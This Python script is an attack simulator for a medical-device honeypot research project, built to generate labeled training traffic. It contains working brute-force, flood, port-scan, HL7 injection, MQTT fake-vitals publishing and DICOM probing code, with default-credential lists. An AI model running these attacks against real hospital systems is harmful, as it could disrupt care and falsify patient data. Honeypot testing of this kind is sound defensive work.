"""
HoneyMed - Phase 2: Attack Simulator
=====================================
Automates various attack types against the honeypot for:
  1. Testing that all services capture data correctly
  2. Generating labeled training data for the ML model

Attack Types:
  - Brute-Force: Login credential stuffing against Web Portal + SSH
  - Port Scan: Enumerate all open honeypot ports (reconnaissance)
  - DoS Flood: HTTP/TCP flood against the web portal
  - HL7 Injection: Send crafted HL7 messages
  - MQTT Probing: Connect and publish/subscribe on medical topics
  - DICOM Probing: Send DICOM association requests

Usage:
  python attacks/attack_simulator.py --target 192.168.1.100 --attack all
  python attacks/attack_simulator.py --target 127.0.0.1 --attack bruteforce
"""

import argparse
import json
import os
import random
import socket
import struct
import sys
import time
import threading
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ---------------------------------------------------------------------------
# Common Credential Lists (realistic medical-device defaults)
# ---------------------------------------------------------------------------
COMMON_USERNAMES = [
    "admin", "root", "nurse", "doctor", "operator", "service",
    "biomedical", "technician", "medadmin", "hl7admin", "dicom",
    "monitoring", "icu_admin", "pharmacy", "radiology", "default",
    "supervisor", "maintenance", "vendor", "support",
]

COMMON_PASSWORDS = [
    "admin", "password", "1234", "12345678", "admin123",
    "meddevice", "patient", "hospital", "changeme", "default",
    "P@ssw0rd", "medical1", "vitals2024", "monitor!", "root",
    "service123", "biomed", "hl7pass", "dicom123", "welcome1",
]


# ---------------------------------------------------------------------------
# Attack Implementations
# ---------------------------------------------------------------------------

class AttackSimulator:
    """Orchestrates various attack simulations against the honeypot."""

    def __init__(self, target_ip: str, verbose: bool = True):
        self.target = target_ip
        self.verbose = verbose
        self.results: list[dict] = []

    def _log(self, msg: str):
        if self.verbose:
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"  [{ts}] {msg}")

    def _record(self, attack_type: str, details: dict):
        self.results.append({
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "attack_type": attack_type,
            "target": self.target,
            **details,
        })

    # --- Brute-Force Attack ---
    def attack_bruteforce_web(self, port: int = 80, max_attempts: int = 50):
        """Brute-force login attempts against the Web Portal."""
        self._log(f"[BRUTEFORCE] Starting web login brute-force on port {port}...")
        url = f"http://{self.target}:{port}/login"
        count = 0

        for username in COMMON_USERNAMES:
            for password in COMMON_PASSWORDS:
                if count >= max_attempts:
                    break
                try:
                    resp = requests.post(url, data={
                        "username": username,
                        "password": password,
                    }, timeout=5)
                    self._record("BRUTEFORCE_WEB", {
                        "username": username,
                        "password": password,
                        "status_code": resp.status_code,
                    })
                    count += 1
                    if count % 10 == 0:
                        self._log(f"  ... {count} attempts sent")
                    time.sleep(0.1)  # Small delay to avoid self-DOS
                except requests.exceptions.ConnectionError:
                    self._log(f"  Connection refused on port {port}")
                    return
                except Exception as e:
                    self._log(f"  Error: {e}")
            if count >= max_attempts:
                break

        self._log(f"[BRUTEFORCE] Completed {count} login attempts.")

    # --- Port Scan ---
    def attack_portscan(self, ports: list[int] | None = None):
        """Scan common and medical-device-specific ports."""
        if ports is None:
            ports = [
                21, 22, 23, 25, 53, 80, 443, 445, 993,
                1883,    # MQTT
                2575,    # HL7
                3306,    # MySQL
                5432,    # PostgreSQL
                8080,    # HTTP Alt
                8443,    # HTTPS Alt
                11112,   # DICOM
                104,     # DICOM Alt
                2761,    # DICOM TLS
            ]

        self._log(f"[PORTSCAN] Scanning {len(ports)} ports on {self.target}...")
        open_ports = []

        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target, port))
                status = "open" if result == 0 else "closed"
                if result == 0:
                    open_ports.append(port)
                    self._log(f"  Port {port}: OPEN")

                self._record("PORTSCAN", {
                    "port": port,
                    "status": status,
                })
                sock.close()
            except Exception as e:
                self._record("PORTSCAN", {"port": port, "status": "error", "error": str(e)})

        self._log(f"[PORTSCAN] Found {len(open_ports)} open ports: {open_ports}")

    # --- DoS Flood ---
    def attack_dos_http(self, port: int = 80, duration_seconds: int = 15, threads: int = 10):
        """HTTP GET flood against the web portal."""
        self._log(f"[DOS] Starting HTTP flood on port {port} for {duration_seconds}s with {threads} threads...")
        url = f"http://{self.target}:{port}/"
        stop_event = threading.Event()
        request_count = [0]

        def _flood():
            while not stop_event.is_set():
                try:
                    requests.get(url, timeout=2)
                    request_count[0] += 1
                except Exception:
                    pass

        flood_threads = []
        for _ in range(threads):
            t = threading.Thread(target=_flood, daemon=True)
            t.start()
            flood_threads.append(t)

        time.sleep(duration_seconds)
        stop_event.set()

        for t in flood_threads:
            t.join(timeout=2)

        self._record("DOS_HTTP_FLOOD", {
            "duration_seconds": duration_seconds,
            "threads": threads,
            "total_requests": request_count[0],
        })
        self._log(f"[DOS] Flood complete. Sent {request_count[0]} requests.")

    def attack_dos_tcp_syn(self, port: int = 80, count: int = 200):
        """TCP connection flood (rapid connect/disconnect)."""
        self._log(f"[DOS] Starting TCP SYN flood on port {port}...")
        success = 0

        for i in range(count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((self.target, port))
                success += 1
                sock.close()
            except Exception:
                pass

        self._record("DOS_TCP_SYN", {"port": port, "attempts": count, "connections": success})
        self._log(f"[DOS] TCP flood complete: {success}/{count} connections.")

    # --- HL7 Injection ---
    def attack_hl7_injection(self, port: int = 2575):
        """Send crafted/malicious HL7 messages."""
        self._log(f"[HL7] Starting HL7 message injection on port {port}...")

        messages = [
            # Normal ADT message (Admit/Discharge/Transfer)
            "MSH|^~\\&|ATTACKER_APP|EVIL_FAC|TARGET_HIS|ICU|20260101120000||ADT^A01|MSG001|P|2.5.1\rPID|1||FAKE123^^^HOSP||DOE^JOHN||19800101|M",
            # Crafted ORM (Order) message
            "MSH|^~\\&|HACKER|MALICIOUS|TARGET|LAB|20260101||ORM^O01|MSG002|P|2.5\rPID|1||PAT999\rORC|NW|ORD001\rOBR|1|||EVIL_TEST^Malicious Order",
            # Buffer overflow attempt
            "MSH|^~\\&|" + "A" * 5000 + "|FAC|TARGET|HIS|20260101||ADT^A01|OVERFLOW|P|2.5",
            # SQL injection in HL7 field
            "MSH|^~\\&|APP|FAC|TARGET|HIS|20260101||QRY^Q01|MSG003|P|2.5\rQRD|20260101|R|I|QUERY001|||RD|' OR 1=1 --|||T",
        ]

        for i, msg in enumerate(messages):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, port))

                # Wrap in MLLP framing
                mllp_msg = b"\x0b" + msg.encode() + b"\x1c\x0d"
                sock.sendall(mllp_msg)

                response = sock.recv(4096)
                self._record("HL7_INJECTION", {
                    "message_index": i,
                    "message_type": msg.split("|")[8] if len(msg.split("|")) > 8 else "CRAFTED",
                    "response_length": len(response),
                })
                self._log(f"  HL7 msg {i+1}: sent ({len(msg)} bytes), response ({len(response)} bytes)")
                sock.close()
            except Exception as e:
                self._log(f"  HL7 msg {i+1}: Error - {e}")

    # --- MQTT Probing ---
    def attack_mqtt_probe(self, port: int = 1883):
        """Connect to MQTT broker and attempt subscribe/publish on medical topics."""
        self._log(f"[MQTT] Starting MQTT probe on port {port}...")

        topics_to_try = [
            "hospital/icu/vitals",
            "hospital/pharmacy/dispenser",
            "medical/device/status",
            "hospital/#",  # Wildcard — try to subscribe to everything
            "$SYS/#",       # System topics — broker info
            "admin/config",
        ]

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port))

            # MQTT CONNECT packet
            client_id = "ATTACKER_CLIENT"
            connect_payload = bytearray()
            # Variable header
            connect_payload += b"\x00\x04MQTT"  # Protocol name
            connect_payload += b"\x04"           # Protocol level (MQTT 3.1.1)
            connect_payload += b"\xC2"           # Connect flags (username + password + clean session)
            connect_payload += b"\x00\x3C"       # Keep alive (60s)
            # Payload
            connect_payload += struct.pack(">H", len(client_id)) + client_id.encode()
            connect_payload += struct.pack(">H", 5) + b"admin"   # Username
            connect_payload += struct.pack(">H", 8) + b"password"  # Password

            # Fixed header
            pkt = bytes([0x10]) + bytes([len(connect_payload)]) + connect_payload
            sock.sendall(pkt)

            resp = sock.recv(4)
            if resp:
                self._record("MQTT_PROBE", {"stage": "connected", "response": resp.hex()})
                self._log(f"  MQTT CONNACK received: {resp.hex()}")

            # Subscribe to medical topics
            for i, topic in enumerate(topics_to_try):
                sub_payload = bytearray()
                pkt_id = struct.pack(">H", i + 1)
                sub_payload += pkt_id
                sub_payload += struct.pack(">H", len(topic)) + topic.encode()
                sub_payload += b"\x00"  # QoS 0

                sub_pkt = bytes([0x82]) + bytes([len(sub_payload)]) + sub_payload
                sock.sendall(sub_pkt)
                self._log(f"  Subscribed to: {topic}")

                self._record("MQTT_SUBSCRIBE_PROBE", {"topic": topic})
                time.sleep(0.2)

            # Publish a malicious payload
            malicious_topic = "hospital/icu/vitals"
            malicious_msg = json.dumps({"patient_id": "HACKED", "heart_rate": 999, "alert": "FAKE ALERT"})
            pub_payload = bytearray()
            pub_payload += struct.pack(">H", len(malicious_topic)) + malicious_topic.encode()
            pub_payload += malicious_msg.encode()

            pub_pkt = bytes([0x30]) + bytes([len(pub_payload)]) + pub_payload
            sock.sendall(pub_pkt)
            self._record("MQTT_PUBLISH_PROBE", {"topic": malicious_topic, "payload": malicious_msg})
            self._log(f"  Published malicious data to {malicious_topic}")

            sock.close()
        except Exception as e:
            self._log(f"  MQTT Error: {e}")

    # --- DICOM Probing ---
    def attack_dicom_probe(self, port: int = 11112):
        """Send DICOM Association requests."""
        self._log(f"[DICOM] Starting DICOM probe on port {port}...")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port))

            # Build A-ASSOCIATE-RQ PDU
            called_ae = "HONEYPOT_PACS".ljust(16).encode()
            calling_ae = "ATTACKER_SCU".ljust(16).encode()

            app_context = b"1.2.840.10008.3.1.1.1"
            app_context_item = b"\x10\x00" + struct.pack(">H", len(app_context)) + app_context

            pdu_body = (
                b"\x00\x01"     # Protocol version
                + b"\x00\x00"   # Reserved
                + called_ae
                + calling_ae
                + (b"\x00" * 32)
                + app_context_item
            )

            pdu = b"\x01\x00" + struct.pack(">I", len(pdu_body)) + pdu_body
            sock.sendall(pdu)

            resp = sock.recv(8192)
            if resp:
                pdu_type = "A-ASSOCIATE-AC" if resp[0] == 0x02 else f"PDU(0x{resp[0]:02x})"
                self._record("DICOM_PROBE", {
                    "pdu_sent": "A-ASSOCIATE-RQ",
                    "response_pdu": pdu_type,
                    "response_length": len(resp),
                })
                self._log(f"  DICOM response: {pdu_type} ({len(resp)} bytes)")

            sock.close()
        except Exception as e:
            self._log(f"  DICOM Error: {e}")

    # --- API Enumeration ---
    def attack_api_enumeration(self, port: int = 80):
        """Probe for sensitive API endpoints."""
        self._log(f"[API] Enumerating API endpoints on port {port}...")

        endpoints = [
            "/api/v1/device/info",
            "/api/v1/vitals/current",
            "/api/v1/firmware/update",
            "/api/v1/config",
            "/hl7",
            "/admin",
            "/api/v1/patients",
            "/api/v1/users",
            "/api/v2/debug",
            "/.env",
            "/backup",
            "/api/v1/logs",
        ]

        for ep in endpoints:
            try:
                url = f"http://{self.target}:{port}{ep}"
                resp = requests.get(url, timeout=3)
                self._record("API_ENUMERATION", {
                    "endpoint": ep,
                    "status_code": resp.status_code,
                    "response_length": len(resp.content),
                })
                self._log(f"  {ep} -> {resp.status_code} ({len(resp.content)} bytes)")
            except Exception as e:
                self._log(f"  {ep} -> Error: {e}")

    # --- Save Results ---
    def save_results(self, output_dir: str = "data/raw"):
        """Save all attack results as labeled JSON for ML training."""
        os.makedirs(output_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(output_dir, f"attack_log_{timestamp}.json")

        with open(filepath, "w") as f:
            json.dump(self.results, f, indent=2)

        print(f"\n  Results saved to {filepath} ({len(self.results)} events)")
        return filepath


# ---------------------------------------------------------------------------
# CLI Entry Point
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="HoneyMed Attack Simulator — Generate labeled attack traffic"
    )
    parser.add_argument("--target", required=True, help="Target IP (honeypot)")
    parser.add_argument(
        "--attack",
        choices=["all", "bruteforce", "portscan", "dos", "hl7", "mqtt", "dicom", "api"],
        default="all",
        help="Attack type to execute",
    )
    parser.add_argument("--verbose", action="store_true", default=True)
    args = parser.parse_args()

    print("=" * 60)
    print("  HoneyMed Attack Simulator")
    print(f"  Target: {args.target}")
    print(f"  Attack: {args.attack}")
    print("=" * 60)

    sim = AttackSimulator(args.target, verbose=args.verbose)

    attack_map = {
        "bruteforce": sim.attack_bruteforce_web,
        "portscan":   sim.attack_portscan,
        "dos":        lambda: (sim.attack_dos_http(), sim.attack_dos_tcp_syn()),
        "hl7":        sim.attack_hl7_injection,
        "mqtt":       sim.attack_mqtt_probe,
        "dicom":      sim.attack_dicom_probe,
        "api":        sim.attack_api_enumeration,
    }

    if args.attack == "all":
        for name, func in attack_map.items():
            print(f"\n{'─' * 40}")
            print(f"  Running: {name.upper()}")
            print(f"{'─' * 40}")
            func()
            time.sleep(1)
    else:
        attack_map[args.attack]()

    sim.save_results()
    print("\nAttack simulation complete.")


if __name__ == "__main__":
    main()
